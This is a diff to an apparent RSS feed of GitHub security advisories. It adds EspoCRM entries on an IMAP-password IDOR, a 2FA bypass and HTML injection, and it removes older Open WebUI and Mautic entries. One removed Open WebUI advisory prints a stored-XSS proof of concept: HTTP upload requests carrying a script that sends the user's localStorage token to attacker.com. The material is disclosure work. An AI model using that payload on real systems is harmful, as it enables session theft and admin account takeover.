@@ -7,7 +7,72 @@
     <atom:link href="https://stephen-cox.github.io/vulnfeed/feed.xml" rel="self"/>
     <docs>http://www.rssboard.org/rss-specification</docs>
     <generator>python-feedgen</generator>
-    <lastBuildDate>Mon, 21 Sep 2026 09:33:52 +0000</lastBuildDate>
+    <lastBuildDate>Tue, 22 Sep 2026 08:59:31 +0000</lastBuildDate>
+    <item>
+      <title>[HIGH] espocrm/espocrm — IDOR allowing user with access to Email Account scope to steal another user's stored IMAP password from Email Account with known ID</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-pj52-qx2q-4qfp</link>
+      <description>CVSS 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) · CWE-522, CWE-639, CWE-862
+
+Affected:
+- composer/espocrm/espocrm &lt;= 10.0.4 (patched: 10.0.5)
+
+---
+
+## Summary&#13;
+&#13;
+An IDOR in `PersonalAccount\Service` allows a user with access to the Email Account scope to steal another user's stored IMAP password from an Email Account with a known record ID. Note that obtaining the victim record ID usually is not trivial.&#13;
+&#13;
+## Credits&#13;
+&#13;
+Researcher: skeletonsec (via GitHub PVR).</description>
+      <guid isPermaLink="false">GHSA-pj52-qx2q-4qfp</guid>
+      <category>HIGH</category>
+      <category>espocrm/espocrm</category>
+      <pubDate>Mon, 21 Sep 2026 15:56:43 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm — A login that stopped at the second factor is accepted on routes that do not require authentication</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-ph8v-hvf5-wgp9</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N) · CWE-287, CWE-305
+
+Affected:
+- espocrm/espocrm &lt;= 10.0.5 (patched: 10.0.6)
+
+---
+
+## Summary&#13;
+&#13;
+A login that stopped at the second factor is accepted on routes that do not require authentication. As a result, knowing username and password of a user with Two-Factor Authentication enabled allows to read certain config parameters which are not exposed to the world.&#13;
+</description>
+      <guid isPermaLink="false">GHSA-ph8v-hvf5-wgp9</guid>
+      <category>MEDIUM</category>
+      <category>espocrm/espocrm</category>
+      <pubDate>Mon, 21 Sep 2026 15:55:19 +0000</pubDate>
+    </item>
+    <item>
+      <title>[MEDIUM] espocrm/espocrm — Unauthenticated stored HTML injection via Lead Capture form</title>
+      <link>https://github.com/espocrm/espocrm/security/advisories/GHSA-xfqv-j65r-qqgh</link>
+      <description>CVSS 4.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N)
+
+Affected:
+- composer/espocrm/espocrm &lt;= 10.0.5 (patched: 10.0.6)
+
+---
+
+## Summary&#13;
+&#13;
+When a  Lead Capture public form is submitted, the entire request body is stored in the `LeadCaptureLogRecord.data`. Later, when an administrator view the lead capture log record (by clicking View from the dropdown in a log record), the `data` field's parsed JSON value is rendered not unescaped, allowing certain HTML content to be rendered in the interface.&#13;
+&#13;
+## Note&#13;
+&#13;
+JavaScript execution is prevented by the Content Security Policy. While certain HTML elements can be rendered, this capability is also limited.&#13;
+&#13;
+</description>
+      <guid isPermaLink="false">GHSA-xfqv-j65r-qqgh</guid>
+      <category>MEDIUM</category>
+      <category>espocrm/espocrm</category>
+      <pubDate>Mon, 21 Sep 2026 15:30:47 +0000</pubDate>
+    </item>
     <item>
       <title>[LOW] WordPress/wordpress-develop — HTML API: `set_modifiable_text()` allows breaking out of a comment via abrupt-closing sequences</title>
       <link>https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rmpv-w5v9-rqh5</link>
@@ -3726,154 +3791,6 @@ Attackers can send a a link to a shared chat transcript to other users on the sa
       <category>HIGH</category>
       <category>pip:open-webui</category>
       <pubDate>Tue, 07 Jul 2026 16:50:59 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] pip:open-webui — Open WebUI  allows limited stored XSS vila uploaded html file (CVE-2025-46571)</title>
-      <link>https://github.com/advisories/GHSA-8gh5-qqh8-hq3x</link>
-      <description>CVE-2025-46571 · CVSS 6.4 (CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:H/SI:H/SA:N) · CWE-79, CWE-87
-
-Affected:
-- pip/open-webui &lt; 0.6.6 (patched: 0.6.6)
-
----
-
-### Summary
-Low privileged users can upload HTML files which contain JavaScript code via the `/api/v1/files/` backend endpoint. This endpoint returns a file id, which can be used to open the file in the browser and trigger the JavaScript code in the user's browser. Under the default settings, files uploaded by low-privileged users can only be viewed by admins or themselves, limiting the impact of this vulnerability.
-
-### Details
-
-The following HTTP request can be sent to the backend server to upload a file with the contents:
-`&lt;script&gt;fetch("https://attacker.com/?token=" + localStorage.getItem("token"))&lt;/script&gt;`
-
-```http
-POST /api/v1/files/ HTTP/1.1
-Host: localhost:8080
-Content-Length: 286
-authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijg2NjA1NTZhLTc0OWQtNDdmNS1iMjgwLWRiYzkyYzc2ZjM1NiJ9.4cImklYQUVi3dlXmRtQwdZKEleu0cq4tXompMod8X2U
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr0PnRBBHKXD9UEdm
-
-------WebKitFormBoundaryr0PnRBBHKXD9UEdm
-Content-Disposition: form-data; name="file"; filename="test.html"
-Content-Type: text/html
-
-&lt;h1&gt;padding&lt;/h1&gt;
-&lt;script&gt;fetch("https://attacker.com/?token=" + localStorage.getItem("token"))&lt;/script&gt;
-------WebKitFormBoundaryr0PnRBBHKXD9UEdm--
-```
-
-Note the `filename="test.html"` , `Content-Type: text/html`, and `&lt;h1&gt;padding&lt;/h`&gt; in the request's body. These are important because some form of sanitization or filtering was observed which caused errors when uploading an html file that only conained a `&lt;script&gt;` tag. 
-
-The backend server responds to the above request with JSON data that contains an `id` parameter. 
-
-![image](https://github.com/user-attachments/assets/ac15e108-d385-4e58-b29a-eb79aafbffda)
-
-This ID can be used to view the uploaded file in the browser at `&lt;Backend_URL&gt;/api/v1/files/&lt;file_id&gt;/content/html`
-
-Because of the authorization checks done on lines https://github.com/open-webui/open-webui/blob/main/backend/open_webui/routers/files.py#L434-L438, this file can only be viewed by admins and the user that uploaded it, but not by other low-privileged users, thus limiting the imact of this stored XSS vulnerability.
-
-### PoC
-
-First, upload an html containing JavaScript code to the backend server using the following HTTP request:
-```http
-POST /api/v1/files/ HTTP/1.1
-Host: localhost:8080
-Content-Length: 286
-authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Ijg2NjA1NTZhLTc0OWQtNDdmNS1iMjgwLWRiYzkyYzc2ZjM1NiJ9.4cImklYQUVi3dlXmRtQwdZKEleu0cq4tXompMod8X2U
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr0PnRBBHKXD9UEdm
-
-------WebKitFormBoundaryr0PnRBBHKXD9UEdm
-Content-Disposition: form-data; name="file"; filename="test.html"
-Content-Type: text/html
-
-&lt;h1&gt;padding&lt;/h1&gt;
-&lt;script&gt;fetch("https://attacker.com/?token=" + localStorage.getItem("token"))&lt;/script&gt;
-------WebKitFormBoundaryr0PnRBBHKXD9UEdm--
-```
-
-Then copy the `id` from the response and use it to view the file in the browser at `&lt;Backend_URL&gt;/api/v1/files/&lt;file_id&gt;/content/html`
-
-
-### Impact
-
-Low privileged users can upload HTML files containing malicious JavaScript code. A link to such a file can be sent to an admin, and if clicked, will give the low-privileged user complete control over the admin's account, ultimately enabling RCE via functions, as described in https://github.com/open-webui/open-webui/security/advisories/GHSA-9f4f-jv96-8766</description>
-      <guid isPermaLink="false">GHSA-8gh5-qqh8-hq3x</guid>
-      <category>MEDIUM</category>
-      <category>pip:open-webui</category>
-      <pubDate>Tue, 07 Jul 2026 16:50:43 +0000</pubDate>
-    </item>
-    <item>
-      <title>[CRITICAL] composer:mautic/core — Mautic has Server-Side Template Injection (SSTI) in Theme Templates (CVE-2026-9558)</title>
-      <link>https://github.com/advisories/GHSA-9fx4-7cmj-47vg</link>
-      <description>CVE-2026-9558 · CVSS 9.9 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H) · CWE-1336
-
-Affected:
-- composer/mautic/core &gt;= 1.3.0, &lt; 4.4.13
-- composer/mautic/core &gt;= 5.0.0, &lt; 5.2.11 (patched: 5.2.11)
-- composer/mautic/core &gt;= 6.0.0, &lt; 6.0.9 (patched: 6.0.9)
-- composer/mautic/core &gt;= 7.0.0, &lt; 7.1.2 (patched: 7.1.2)
-
----
-
-### Summary
-A Server-Side Template Injection (SSTI) vulnerability exists in Mautic's theme engine. The platform renders uploaded Twig templates without a sandbox or strict function restrictions. Authenticated users with permissions to create or upload themes can abuse this to execute arbitrary code.
-
-### Impact
-An authenticated user with theme upload and creation privileges can bypass boundaries to execute arbitrary system commands on the hosting server (Remote Code Execution) or access restricted system files and configuration settings.
-
-### Patched Versions
-This security issue has been addressed in the following releases:
-* **7.1.2**
-* **6.0.9**
-* **5.2.11**
-
-For users on Mautic 4.x, this fix is available in:
-* **4.4.20** via [ELTS](https://mautic.org/extended-long-term-support-elts/)
-
-Mautic strongly recommend upgrading to a patched version immediately.
-
-### Workarounds
-There are no official workarounds. To mitigate this vulnerability without upgrading, restrict theme upload and creation permissions (`core:themes:create`) to only highly trusted administrators.</description>
-      <guid isPermaLink="false">GHSA-9fx4-7cmj-47vg</guid>
-      <category>CRITICAL</category>
-      <category>composer:mautic/core</category>
-      <pubDate>Thu, 02 Jul 2026 19:48:08 +0000</pubDate>
-    </item>
-    <item>
-      <title>[MEDIUM] composer:mautic/core — Mautic Focus component Vulnerable to SSRF (CVE-2026-9557)</title>
-      <link>https://github.com/advisories/GHSA-jmv8-8j9j-rcpc</link>
-      <description>CVE-2026-9557 · CVSS 6.4 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:N) · CWE-918
-
-Affected:
-- composer/mautic/core &gt;= 4.0.0, &lt;= 4.4.13
-- composer/mautic/core &gt;= 5.0.0, &lt; 5.2.11 (patched: 5.2.11)
-- composer/mautic/core &gt;= 6.0.0, &lt; 6.0.9 (patched: 6.0.9)
-- composer/mautic/core &gt;= 7.0.0, &lt; 7.1.2 (patched: 7.1.2)
-
----
-
-### Summary
-A Server-Side Request Forgery (SSRF) vulnerability exists in the Mautic Focus component (`MauticFocusBundle`). Under certain conditions, insufficiency in validating user-supplied URLs allows authenticated users to trigger outbound HTTP requests from the hosting server.
-
-### Impact
-An authenticated user with access to the Mautic panel can exploit this vulnerability to perform internal port probing or force the server to initiate requests to external or arbitrary internal destinations. This can enable internal network reconnaissance or mapping of firewalled infrastructure.
-
-### Patched Versions
-This security issue has been fixed in the following releases:
-* **7.1.2**
-* **6.0.9**
-* **5.2.11**
-* **4.4.20** [ELTS](https://mautic.org/extended-long-term-support-elts/)
-
-Mautic strongly recommend upgrading to the latest version corresponding to your release branch.
-
-### Workarounds
-There are no official workarounds. To completely mitigate the exposure without upgrading, disabling or limiting external network access from the Mautic web server to internal-only subnets/local hosts is recommended.</description>
-      <guid isPermaLink="false">GHSA-jmv8-8j9j-rcpc</guid>
-      <category>MEDIUM</category>
-      <category>composer:mautic/core</category>
-      <pubDate>Thu, 02 Jul 2026 19:47:38 +0000</pubDate>
     </item>
   </channel>
 </rss>
